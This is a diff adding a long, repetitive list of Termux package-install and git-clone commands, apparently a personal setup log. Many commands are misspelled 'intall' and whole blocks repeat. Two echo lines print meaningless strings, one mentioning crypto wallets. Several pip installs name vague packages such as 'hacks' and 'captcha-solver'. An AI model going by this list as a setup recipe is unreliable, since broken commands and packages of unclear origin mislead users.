+git clone https://github.com/termux/glibc-packages
+git clone https://github.com/termux/repology-metadata
+git clone https://github.com/termux/termux-language-server
+git clone https://github.com/termux/termux-docker
+git clone https://github.com/termux/proot
+git clone https://github.com/termux/termux-services
+git clone https://github.com/termux/termux-elf-cleaner
+git clone https://github.com/termux/TermuxAm
+git clone https://github.com/termux/command-not-found
+git clone https://github.com/termux/termux-am-socket
+git clone https://github.com/termux/termux-am-library
+git clone https://github.com/termux/wcwidth
+git clone https://github.com/termux/tergent
+git clone https://github.com/termux/tsu
+git clone https://github.com/pkgcore/pkgrepo
+open url https://www.boe.es/redes_sociales?pag=tw
+apt search pip
+pkg install matplotlib -y --aarch64
+pkg clear
+pkg upgrade -y 
+pkg install matplotlib
+apt install -y termux-am termux-am-socket termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools
+
+cd ~
+git clone https://github.com/termux/termux-packages.git
+apt clean 
+clear 
+pkg clear 
+termux-reload-settings 
+pkg update -y 
+pkg upgrade -y 
+pkg upgrade -y
+pkg in build-essential
+apt install -y samba libcairomm-1.0 libcap libidn2 libisofs libjasper libjasper-utils libksba libnghttp2 libsigc++-2.0 libsigc++-3.0 libtpms libtvision libzmq openjpeg openjpeg-tools range-v3 stdman dirb fzf fzy glow harfbuzz harfbuzz-icu harfbuzz-utils lexter pick wuzz zziplib zzuf zzuf-static fatsort fcp libcap libhtmlcxx libice liblua51 libsm libx11 libx11-static libxau libxcb libxdmcp libxext libxfixes libxi libxrandr libxss libxt libzxing-cpp lua51 openjdk-21-x screen tergent x11-repo xorgproto
+pkg upgrade -y
+pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo libapt-pkg-perl pkg-config pkgfile pkgtop cfengine cfengine-static cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks m4 man md mdns-scan microsocks mlocate mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
+apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
+pkg install -y abook aerc aichat 
+pkg install -y alembic alpine amfora ani-cli 
+pkg install -y boinctui bombadillo bore cadaver catgirl 
+pkg install -y cec-client cliaoke clidle clifm
+pkg install -y clinfo clipp cloneit cookcli 
+pkg install -y corgi dictd discordo dnsutils 
+pkg install -y doge dropbear duckdb ecj fdroidcl 
+pkg install -y ffsend finch geckodriver geographiclib 
+pkg install -y glab-cli glow gomp gomuks hcloud hummin 
+pkg install -y hut ices inxi irssi jack-example-tools jfrog-cli jftui jira-go jql k9s 
+pkg install -y kakoune-lsp kubectl lastpass-cli lftp libc-client libc-client-static libcurl libhiredis libice 
+pkg install -y libmesode libmpdclient libnats-c 
+pkg install -y libneon libnfs libnl-cli 
+pkg install -y libnl-cli-static libshout 
+pkg install -y libsoup libsoup3 libssh2 libtd libusbmuxd libx11 libxcb libxrender 
+pkg install -y lux mangal markdown-flashcards matterircd minidlna miniupnpc 
+pkg install -y monolith mosquitto mpdscribble msmtp mu mutt mympd ncdc ncmpcpp 
+pkg install -y ncspot octave openethereum 
+pkg install -y pastebinit pianobar pounce profanity python-pynvim q-dns-client 
+pkg install -y railway-cli rbw rdircd restish rirc rtorrent sd seafile-client 
+pkg install -y seafile-client-static senpai serf snapcast-client snapcast-server 
+pkg install -y snowflake-client sssnake step-cli storj-uplink sun tea
+pkg install -y telegram-cli tintin++ tinyfugue tizonia toxic transmission trzsz-ssh ttyc virustotal-cli 
+pkg install -y wakatime-cli waypipe websocat weechat whois wireproxy ytui-music 
+pkg install -y liblqr libnewt libpoco libsamplerate libstemmer 
+pkg install -y libtreesitter libxcvt
+pkg install -y llvm-mingw-w64 
+
+pkg install -y llvm-mingw-w64-libcompiler-rt 
+
+pkg install -y llvm-mingw-w64-tools
+pkg install -y llvm-mingw-w64-ucrt blackbox box2d boxedwine 
+pkg install -y boxes bubblewrap busybox dosbox 
+pkg install -y dosbox-x
+pkg install -y dosbox-x-data feed2imap-go 
+pkg install -y fluxbox hstr isync mailsync matchbox-keyboard 
+
+pkg install -y obconf 
+
+pkg install -y obconf-qt 
+
+pkg install -y openbabel 
+
+
+pkg install -y openbox 
+
+pkg install -y openbox-static rhythmbox rhythmbox-help shellinabox sing-box squeezelite the-powder-toy whiptail whitebox-tools xfce4-mailwatch-plugin 
+
+
+pkg install -y gcc-default-9 
+
+pkg install -y gnome-text-editor lxde-icon-theme marco mcfly pwgen xfce4-screensaver
+
+
+pkg install -y gcc-default
+pkg install -y gcc-default-10
+
+pkg install -y gcc-default-11
+
+pkg install -y gcc-default-12
+
+pkg install -y gcc-default-13
+
+pkg install -y gcc-default-14 
+
+
+pip install lolcat
+pip install autoclick
+pkg install -y python-scipy
+
+pkg install -y python-numpy-static
+pkg install -y jump 
+pkg install -y markdown-flashcards 
+pkg install -y tcl 
+pkg install -y typst
+
+pkg install -y netsurf
+pkg install -y tsu
+
+pkg install -y curl 
+pkg install -y curlie 
+pkg install -y libcurl 
+pkg install -y libcurl-static 
+pkg install -y websocat
+
+pkg intall -y bluefish
+
+pkg intall -y cuse
+
+pkg intall -y dialog
+
+pkg intall -y eww
+
+pkg intall -y gengetopt
+
+pkg intall -y getconf
+
+pkg intall -y geth
+
+pkg intall -y geth-utils
+
+pkg intall -y gettext
+pkg intall -y gettext-static
+
+pkg intall -y gifsicle
+
+pkg intall -y kf6-kcompletion
+
+pkg intall -y kf6-kconfigwidgets
+
+pkg intall -y kf6-ki18n
+
+pkg intall -y kf6-kjobwidgets
+
+pkg intall -y kf6-ktextwidgets
+
+pkg intall -y kf6-kwidgetsaddons
+
+pkg intall -y kf6-purpose
+
+pkg intall -y libcwidget
+
+pkg intall -y libcwidget-static
+
+pkg intall -y libfinalcut
+
+pkg intall -y libgedit-gtksourceview
+
+pkg intall -y libnewt
+
+pkg intall -y libt3widget
+
+pkg intall -y libxaw
+
+pkg intall -y libxfce4ui
+
+pkg intall -y motif
+
+pkg intall -y nzbget
+
+pkg intall -y qcustomplot
+
+pkg intall -y qtermwidget
+
+pkg intall -y qtutilities
+
+pkg intall -y rust-std-aarch64-linux-android
+
+pkg intall -y rust-std-armv7-linux-androideabi
+
+pkg intall -y rust-std-i686-linux-android
+
+pkg intall -y rust-std-wasm32-unknown-unknown
+
+pkg intall -y rust-std-wasm32-wasi
+
+pkg intall -y rust-std-wasm32-wasip1
+
+pkg intall -y rust-std-wasm32-wasip2
+
+pkg intall -y rust-std-x86-64-linux-android
+pkg intall -y teleport-tsh 
+pkg intall -y uget 
+pkg intall -y vegeta 
+pkg intall -y wget 
+pkg intall -y wget2
+pkg intall -y wget2-static 
+pkg intall -y wgetpaste 
+pkg intall -y wxwidgets 
+pkg intall -y xsel
+
+
+pkg intall -y blk-utils
+
+pkg intall -y bluefish
+
+pkg intall -y build-essential
+
+pkg intall -y clinfo
+
+pkg intall -y clpeak
+
+pkg intall -y codeblocks
+
+pkg intall -y cryptsetup
+
+pkg intall -y cscope
+
+pkg intall -y devilspie
+
+pkg intall -y devilspie2
+
+pkg intall -y dtc
+
+pkg intall -y erofs-utils
+
+pkg intall -y ethtool
+
+pkg intall -y freeimage
+
+pkg intall -y frida
+
+pkg intall -y frida-dev
+
+pkg intall -y gauche
+
+pkg intall -y gecode
+
+pkg intall -y glfw
+
+pkg intall -y hz
+
+pkg intall -y i2c-tools
+
+pkg intall -y icu-devtools
+
+pkg intall -y ipmitool
+
+pkg intall -y iw
+
+pkg intall -y kf6-purpose
+
+pkg intall -y ladspa-sdk
+
+pkg intall -y libblkid
+
+pkg intall -y libccid
+
+pkg intall -y libcdk
+pkg intall -y libcoap
+
+pkg intall -y libcryptsetup
+
+pkg intall -y libdevil
+
+pkg intall -y libdevmapper
+
+pkg intall -y libevdev
+
+pkg intall -y libevdev-static
+
+pkg intall -y libgedit-tepl
+
+pkg intall -y libimobiledevice
+
+pkg intall -y libimobiledevice-glue
+
+pkg intall -y libimobiledevice-glue-static
+pkg intall -y libimobiledevice-static
+
+pkg intall -y libmnl
+
+pkg intall -y libtheora
+
+pkg intall -y libusb
+
+pkg intall -y libusbmuxd
+
+pkg intall -y libusbredir
+
+pkg intall -y libv4l
+
+pkg intall -y libvmaf
+pkg intall -y libwolfssl
+pkg intall -y lit
+pkg intall -y llvm-tools
+
+pkg intall -y lvm2
+
+pkg intall -y mate-common
+
+pkg intall -y miniupnpc
+
+pkg intall -y mtd-utils
+
+pkg intall -y mtdev-static
+
+pkg intall -y openjdk-17
+
+pkg intall -y openjdk-21
+
+pkg intall -y panda3d
+
+pkg intall -y pciutils
+pkg intall -y python-cryptography
+
+pkg intall -y qt-creator
+
+pkg intall -y qt5-qttools
+
+pkg intall -y qt6-qttools
+
+pkg intall -y rgbds
+
+pkg intall -y root-repo
+
+pkg intall -y rustc-dev
+
+pkg intall -y scrcpy
+
+pkg intall -y scrub
+
+pkg intall -y teleport-tsh
+
+pkg intall -y termux-x11-nightly
+
+pkg intall -y usbmuxd
+
+pkg intall -y v4l-utils
+
+pkg intall -y wavemon
+
+pkg intall -y xfce4-dev-tools
+
+pkg intall -y z-push
+
+pip install pyopenssl telethon requests captcha-solver
+pip install pychroot --no-deps
+pip install librosa --no-deps
+
+cd ~
+cd /data/data/com.termux
+passwd
+pwd
+apt clean 
+clear 
+pkg clear 
+termux-reload-settings 
+pkg update -y 
+pkg upgrade -y 
+pkg upgrade -y
+pkg in build-essential
+apt install -y samba libcairomm-1.0 libcap libidn2 libisofs libjasper libjasper-utils libksba libnghttp2 libsigc++-2.0 libsigc++-3.0 libtpms libtvision libzmq openjpeg openjpeg-tools range-v3 stdman dirb fzf fzy glow harfbuzz harfbuzz-icu harfbuzz-utils lexter pick wuzz zziplib zzuf zzuf-static fatsort fcp libcap libhtmlcxx libice liblua51 libsm libx11 libx11-static libxau libxcb libxdmcp libxext libxfixes libxi libxrandr libxss libxt libzxing-cpp lua51 openjdk-21-x screen tergent x11-repo xorgproto
+pkg upgrade -y
+pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo libapt-pkg-perl pkg-config pkgfile pkgtop cfengine cfengine-static cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks m4 man mdns-scan microsocks mlocate mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
+apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
+apt install -y google-drive-upload
+apt install -y google-glog
+apt install -y googletest
+apt install -y translate-shell
+apt install -y aapt
+apt install -y aapt2
+
+
+apt install -y cfengine
+apt install -y cfengine-static python python2
+apt install -y cfm
+pkg install git ffmpeg htop vim bison 
+apt install -y autoconf resolv-conf yasm flex make cmake automake bat rcs abduco acr 
+git clone https://github.com/termux/proot-distro
+git clone https://github.com/termux/termux-auth
+git clone https://github.com/termux/termux-widget
+git clone https://github.com/termux/termux-tools
+git clone https://github.com/termux/glibc-packages
+git clone https://github.com/termux/repology-metadata
+git clone https://github.com/termux/termux-language-server
+git clone https://github.com/termux/termux-docker
+git clone https://github.com/termux/proot
+git clone https://github.com/termux/termux-services
+git clone https://github.com/termux/termux-elf-cleaner
+git clone https://github.com/termux/TermuxAm
+git clone https://github.com/termux/command-not-found
+git clone https://github.com/termux/termux-am-socket
+git clone https://github.com/termux/termux-am-library
+git clone https://github.com/termux/wcwidth
+git clone https://github.com/termux/tergent
+git clone https://github.com/termux/tsu
+git clone https://github.com/pkgcore/pkgrepo
+open url https://www.boe.es/redes_sociales?pag=tw
+apt search pip
+pkg install matplotlib -y --aarch64
+pkg clear
+pkg upgrade -y 
+pkg install matplotlib
+apt install -y termux-am termux-am-socket termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools
+
+cd ~
+git clone https://github.com/termux/termux-packages.git
+cd ~ 
+cd ~/termux-packages/scripts 
+bash ~/termux-packages/scripts/setup-termux.sh
+cd /data/data/com.termux/files/home/
+apt install -y abook agate age angband ansifilter apt-ftparchive arturo asciidoc attr barcode bc-gh boxes bsd-games busybox byobu c-script cabextract catdoc ccextractor chafa clifm clvk coreutils ctags d8 datamash deutex dex2jar dialog dmagnetic dos2unix dte dx e2fsprogs e2tools elinks elvish emacs enscript esbuild exercism exhale exiftool exiv2 expect fastmod fatsort figlet finch flex flex-static frp fte gawk gdbm gettext gettext-static gexiv2 git-lfs gitflow-avh grex groff groonga harfbuzz harfbuzz-icu helix hexcurse hexedit hexer hexyl hilbish html2text hugo hz icoutils influxdb innoextract ired jack-example-tools jhead joe jove jupp kbd kcptun kibi ldns less lexbor lexter libandroid-complex-math libandroid-execinfo libandroid-execinfo-static libandroid-wordexp libandroid-wordexp-static libbluray-utils libcaca libccd libebml libexif libexif-static libexpat libexpat-static libfcl libfinalcut libfreexl libfreexl-static libgnt libhyphen libice libimagequant libimtui liblog4c libmpc libmuparser libnettle libnewt libosl libphysfs libpipeline libraqm libre2 libregexp-assemble-perl librime librttopo libsoldout libspatialindex libspatialite libspeex libspeex-static libt3highlight libtool libtsduck libuber-h3 libucontext libucontext-static libxcfun libxext libxext-static libxfixes libxi libxls libxlsxwriter libxrandr libxrender libxss libxtst links lipl llvm locustdb lrzip lsd lua51 lua52 lua53 lua54 lynx media-types micro miller morse2ascii mp3cat mu nano ncurses ne neovim newsboat notmuch nsnake o-editor ocrad odt2txt onigmo oniguruma oorexx oorexx-static openexr pango parallel pass-otp patchelf pcre pcre2 pcre2grep pcregrep pdfgrep perl-rename pgroonga php-imagick php-psr php-redis php-zephir-parser pkgfile plantuml poke postgis proxychains-ng ptex ptex-static pueue qhull radare2 ragel rdrview re2c recoll recutils rgbds rnr ruby-ri ruff rush screen sed shell2http shellinabox sops speex-utils speexdsp speexdsp-static sqlcipher srt2vobsub ssdeep starship tcsh tectonic tere termux-exec tex-gyre texinfo texlab texlive-bin texlive-bin-static texlive-installer tig tilde tintin++ tinyfugue tmate tmux toilet translate-shell unar unrar unshield up update-info-dir upx uv vale vamp-plugin-sdk vobsub2srt vtm vulkan-extension-layer w3m wakatime-cli wasmedge watchexec wdiff weechat xxhash zk
+
+apt update
+apt upgrade
+apt update
+apt install -y aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static valgrind valgrind-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
+echo -e "ip==open --sys(system)default.blockchain.ntl(eth0.*::/$*=(binance,coinbase,wallet,gas.fee.aptitude.//-0/#:)--12#$$#\[%])::" 
+pkg in build-essential -y
+apt install -y aptitude toilet figlet cowsay ruby python-pip python3 php doxygen resolv-conf automake flex yasm urdfdom telegram-bot-api robotfindskitten libotr-static libotr libdart libbullet botan3-static botan3 libwv libtiledb libxslt python-lxml python-libsass sassc speexdsp ssdeep-static libacl libao libarchive libasio libasm libasm-static libass libass-static libassuan libatomic-ops
+apt update
+echo "6/12)-*0*;1.1//@///#/$*/*"
+apt upgrade -y 
+pip install wheel beautifulsoup4 colorama requests telethon pytz pyaes proxy.py
+
+apt install -y autoconf resolv-conf automake php prover9 z3 dcmtk git-gitk pdftk pypy-tkinter pypy3-tkinter python-tkinter tk git proot wget curl zziplib assimp osm2pgsql mg vile gap
+
+apt install -y flex yasm 
+
+apt install -y gcal libgc libgc-static libgcrypt libgcrypt-static libsigc++-2.0 libsigc++-3.0 pngcrush
+
+apt install -y flex-static libfcl liblog4c libphysfs libpipeline libsoldout yasm-static
+
+apt install -y ctags esbuild fossil gbt glib gn gradle hz ldc mani
+
+apt install -y libresolv-wrapper libunbound resolv-conf
+
+apt install -y libarchive libarchive-static libchipmunk libhdf5 libopencc libtalloc libuber-h3 libunbound libyaml-cpp libzip lua-lpeg macchina marisa memcached muchsync ncompress netcdf-c mbedtls mc 
+
+apt install -y miniserve monolith moreutils zile cgdb
+
+apt install -y mruby msmtp mupdf mupdf-tools mympd n2n ncdc nginx ngircd oathtool oathtool-static openethereum pass
+
+apt install -y pcal proxychains-ng pup python-greenlet python-grpcio python-libsass python-lxml restish serd serf shell2http shellharden shtool signify slashtime
+
+apt install -y libforestdb libfreexl libftxui libgcrypt libgf2x libglvnd libgnt libgpg-error
+
+apt install -y libgrpc libgts libhdf5 libhiredis libhtmlcxx libical libicu libimagequant libjansi
+
+apt install -y libliquid-dsp libmad libmcrypt libmesode
+
+apt install -y libmhash libmicrohttpd libmnl libmp3lame libncnn libnova liboggz
+
+apt install -y libopencc libosl libotr libplist libpoco libpolly libprotozero libraqm
+
+apt install -y aha ansifilter console-bridge dasel docbook-xml docbook-xsl enscript g-ir-scanner
+
+apt install -y gumbo-parser html-xml-utils html2text imlib2
+
+apt install -y imlib2-static libebml libexpat libhtmlcxx libhtmlcxx-static
+
+apt install -y id3lib imlib2 ipcalc iperf3 json-glib
+
+apt install -y at-spi2-core cfengine codecrypt console-bridge golang-doc heyu libnewt libolm libtreesitter
+
+apt install -y libdvbcsa libdvbpsi libvbisam tvheadend vbindiff ocl-icd octave opencl-clhpp opencl-headers opencl-vendor-driver openethereum outfieldr pastebinit peaclock
+
+apt install -y go-musicfox
+
+apt install -y libfcft
+apt install -y libxcfun
+apt install -y mcfly
+apt install -y ncftp
+apt install -y openfoam
+
+apt install -y recutils
+apt install -y gbt
+apt install -y hstr
+apt install -y zsh
+apt install -y zsh-completions
+
+apt install -y  brook fact++ fastmod fdupes freeimage libandroid-wordexp libbullet libccd libdav1d
+
+apt install -y nsis ocl-icd odt2txt okc-agents oorexx open-adventure openal-soft openbabel opencc-tools
+
+apt install -y opencl-clhpp
+
+apt install -y opencl-headers
+
+apt install -y opencl-vendor-driver opencolorio
+
+apt install -y opencv opencv-python openethereum
+
+apt install -y openethereum-utils openexr openfoam opengl openjdk-17 
+
+apt install -y openjdk-17-source
+
+apt install -y openjdk-17-x openjpeg openjpeg-tools openldap
+
+apt install -y openldap-static openmpi 
+
+apt install -y openmpi-static openscad openssh 
+
+apt install -y openssh-sftp-server openssl
+
+apt install -y openssl-1.1
+
+apt install -y openssl-1.1-static 
+
+apt install -y openssl-static
+
+apt install -y openssl-tool openssl1.1-tool
+
+apt install -y b3sum binutils binutils-bin binutils-cross 
+
+apt install -y binutils-gold binutils-is-llvm binutils-libs blk-utils 
+
+apt install -y coreutils dateutils debianutils
+
+apt install -y diffutils dmtx-utils dnsutils dnsutils-static dwarves
+
+apt install -y elfutils findutils fontconfig-utils geth-utils giflib-utils
+
+apt install -y harfbuzz-utils hfsutils html-xml-utils icoutils
+
+apt install -y inetutils knot-utils libbluray-utils libcoinor-utils
+
+apt install -y libcoinor-utils-static libjasper-utils
+
+apt install -y librinutils libtiff-utils libxml2-utils littlecms-utils
+
+apt install -y mailutils mailutils-static moreutils mount-utils 
+
+apt install -y mtd-utils ncurses-utils nss-utils openethereum-utils 
+
+apt install -y qemu-utils recutils recutils-static renameutils 
+
+apt install -y sensible-utils sharutils speex-utils uuid-utils vtutils xz-utils
+
+apt install -y adms iverilog iverilog-static gpgv minisign par2 rhash signify vera ca-certificates ca-certificates-java libandroid-stub libksba aapt aapt2 abootimg aidl android-tools apksigner d8 dex2jar libandroid-complex-math libandroid-complex-math-static libandroid-utimes-static tergent termux-am termux-elf-cleaner tvheadend vulkan-loader-android
+
+
+apt install -y libzen libzen-static libzim libzimg
+
+apt install -y libzimg-static libzip libzita-convolver libzix libzmq 
+
+apt install -y libzmq-static libzopfli
+
+apt install -y libzxing-cpp
+
+apt install -y mediainfo mlir morse2ascii mutt
+
+apt install -y myman navidrome ndk-multilib-native-static
+
+apt install -y ndk-multilib-native-stubs ndk-sysroot
+
+apt install -y panda3d pygobject pystring python-apsw python-bcrypt python-ensurepip-wheels python-greenlet
+
+apt install -y python-grpcio python-libsass python-lxml python-numpy python-pillow python-pyarrow python-sabyenc3 python-torch python-torchaudio ruff vim-python weechat-matrix-rs weechat-python-plugin
+apt install -y nmap-ncat odt2txt oh-my-posh sse2neon lsd
+
+apt install -y aalib apr apr-util base16384 bitcoin boost brook busybox cuetools db dnstop dx fdisk fossil gdbm geoip2-database gkermit glulxe gobang guile18 influxdb kcptun libass libatomic-ops libdb libduckdb libduktape libfdisk libffi libhiredis libimagequant libkokkos liblightning liblzo libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm locustdb microsocks miller monetdb natpmpc ngircd osm2pgsql patchelf pcaudiolib pforth phpmyadmin portaudio postgis postgresql python-bcrypt ragel recutils redis sfeed shtool sqlcipher ssdb unicode-data upx usql utf8cpp uthash yq tk 
 
 apt install -y capstone-static
 
@@ -2026,8 +7153,6 @@ apt install -y libmaa-static
 apt install -y libmad
 
 apt install -y libmad-static
-
-apt install -y libmariadbcpp
 
 apt install -y libmatio
 
@@ -3354,8 +8479,6 @@ apt install -y glib-bin
 
 apt install -y glm
 
-apt install -y gnutls
-
 apt install -y google-glog
 
 apt install -y gpgme
@@ -3555,10 +8678,6 @@ apt install -y libgit2
 apt install -y libglvnd
 
 apt install -y libgmp
-
-apt install -y libgnustep-base
-
-apt install -y libgnutls
 
 apt install -y libgpg-error
 
@@ -5085,8 +10204,6 @@ apt install -y e2fsprogs
 
 apt install -y e2tools
 
-apt install -y gnucobol
-
 apt install -y gpsbabel
 
 apt install -y haproxy
@@ -6263,45 +11380,6 @@ apt install -y ethtool
 apt install -y findomain
 
 apt install -y freecolor
-apt install -y gdb
-
-apt install -y gettext
-
-apt install -y gforth
-
-apt install -y glpk
-
-apt install -y gnucap
-
-apt install -y gnuchess
-
-apt install -y gnucobol
-
-apt install -y gnucobol-static
-
-apt install -y gnugo
-
-apt install -y gnuit
-
-apt install -y gnunet
-
-apt install -y gnunet-static
-apt install -y gnupg
-
-apt install -y gnuplot
-
-apt install -y gnurl
-
-apt install -y gnurl-static
-
-apt install -y gnushogi
-
-apt install -y gnuski
-apt install -y gnustep-make
-apt install -y gnutls
-
-apt install -y gpgme
-apt install -y gpgmepp
 
 apt install -y gpgv
 
@@ -6334,17 +11412,9 @@ apt install -y libfuse3
 
 apt install -y libgcrypt
 
-apt install -y libgnustep-base
-apt install -y libgnutls
-
-apt install -y libgnutls-static
-apt install -y libgpg-error
-
 apt install -y libgsasl
 
 apt install -y libidn
-
-apt install -y libiodbc
 
 apt install -y libmpc
 
@@ -6485,6 +11555,3734 @@ pkg install -y gcc-default-12
 pkg install -y gcc-default-13
 
 pkg install -y gcc-default-14 
+
+apt install -y libiodbc
+apt install -y libiodbc-static
+
+
+pkg install byacc libcurl libcurl-static dialog gengetopt getconf geth geth-utils gettext gettext-static libnewt wget entr libsoup3 libsoup alsa-lib alsa-utils ant virglrenderer-android 
+
+pkg install vulkan-extension-layer 
+
+pkg install vulkan-headers 
+
+pkg install vulkan-loader 
+
+pkg install vulkan-loader-android
+
+pkg install bitcoin 
+
+pkg install vulkan-loader-generic 
+
+pkg install vulkan-tools 
+
+pkg install vulkan-utility-libraries 
+
+pkg install vulkan-validation-layers 
+
+pkg install tor 
+
+pkg install totem-pl-parser 
+
+pkg install tree tree-sitter-parsers 
+
+pkg install tree-sitter-vim 
+
+pkg install tree-sitter-vim-static 
+
+pkg install tree-sitter-vimdoc 
+
+pkg install tree-sitter-vimdoc-static 
+
+pkg install valac 
+
+pkg install valac-static 
+
+pkg install valadoc 
+
+pkg install valadoc-static 
+
+pkg install scrypt
+
+pkg install vivid texlive-bin weechat 
+
